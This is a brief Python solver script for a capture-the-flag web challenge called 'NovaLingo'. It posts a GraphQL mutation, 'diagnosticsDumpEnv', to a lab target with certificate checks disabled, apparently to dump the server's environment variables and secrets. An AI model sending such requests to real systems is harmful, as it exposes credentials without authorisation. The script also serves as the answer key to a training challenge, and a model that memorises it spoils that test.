#!/usr/bin/env python3
"""
Solver script for WEB CHALLENGE 1 (NovaLingo)
"""
import requests
import urllib3
import sys

urllib3.disable_warnings()

def solve(base_url):
    graphql_url = f"{base_url.rstrip('/')}/graphql"
    query = """
    mutation {
        diagnosticsDumpEnv
    }
    """
    try:
        r = requests.post(graphql_url, json={"query": query}, verify=False, timeout=10)
        print("[+] Response:", r.text)
    except Exception as e:
        print("[-] Error:", e)

if __name__ == '__main__':
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        url = "https://23d33b01-1aab-4aa3-988d-19dc057069bf.172.31.102.101.nip.io"
    solve(url)
